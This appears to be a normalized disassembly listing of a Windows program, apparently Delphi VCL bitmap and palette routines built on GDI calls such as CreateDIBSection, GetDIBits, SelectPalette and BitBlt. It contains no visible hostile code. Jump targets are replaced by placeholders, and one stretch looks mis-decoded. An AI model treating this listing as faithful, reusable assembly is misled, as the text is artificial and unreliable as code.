add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f002
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4026ec
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_4026ec
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_4026ec
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_4026ec
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_41f002
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f029
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_41f030
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030c0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax esi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_41f080
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_41f0d8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x44 ]
push eax
push ebp
call sub_41f080
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41f121
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_403038
mov edi eax
mov eax esi
call sub_403038
cmp edi eax
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41f25b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41f23e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_407a3c
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f245
mov al 0x1
sub_41f274
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_415d58
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f2bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f2c3
mov eax [ ebp - 0x4 ]
call sub_4030f0
retn
sub_41f2c8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_41f2fc
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_415d58
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f347
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f34e
mov eax [ ebp - 0x4 ]
call sub_4030f0
retn
sub_41f410
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_413c24
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41f4ae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f4b5
mov eax [ rw-data ]
call sub_413c88
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_41f486
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_41f5a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_41d9d4
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_413860
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_41d978
test al al
je r-xdata
sub_41f4bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_413c24
mov esi eax
xor ecx ecx
push ebp
push sub_41f52c
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413c88
retn
mov edx ebx
mov eax esi
call sub_413860
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_41f5a0
sub_41f538
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41d474
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_41f574
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov eax esi
call sub_41f5a0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41d538
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_41f5a0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41d778
xor edx edx
push ebp
push sub_41f634
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41db5c
push ebx
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_413c38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d9d4
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_41f640
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41d778
xor eax eax
push ebp
push sub_41f71f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_42095c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_41f4bc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_420a5c
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41db5c
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_413b9c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d9d4
retn
sub_41f730
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_4030f0
sub_41f750
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_41f4bc
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
call sub_40cb14
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e0
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_41f7ac
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_41bdc8
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_41f4bc
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
call sub_41f4bc
mov eax [ ebx + 0x8 ]
push eax
call DeleteObject
sub_41f7f8
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_41e65c
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41f8a7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_41f8b4
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov dx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_41f900
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41f4bc
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_41dec8
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_41dec8
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_41ff4e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_4026cc
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_41fc58
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_41ddb4
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x24 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_41dec8
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_41dec8
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_41dec8
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_41dec8
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_41feff
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41feee
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x34 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_41fecc
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_41dec8
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_41f8b4
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_4028c8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_41e65c
jmp r-xdata
mov eax [ ebp - 0x24 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41d358
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_41242c
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c698
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41d31c
call sub_41c698
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_41de20
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fed3
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_41dec8
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_41fea2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_41dec8
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
call sub_4026ec
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c698
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41d31c
call sub_41c698
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c698
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41d31c
call sub_41c698
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_41dec8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
call sub_403910
call sub_403910
jmp r-xdata
sub_41fef5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_41ff04
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_40388c
call sub_4038e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_41ff64
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp + 0x4 ] 0x300
mov ax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_41ffc8
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectA
test eax eax
je r-xdata
mov eax ebx
call sub_41f4bc
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4201c3
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_41dec8
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_41dec8
mov [ ebp - 0x10 ] eax
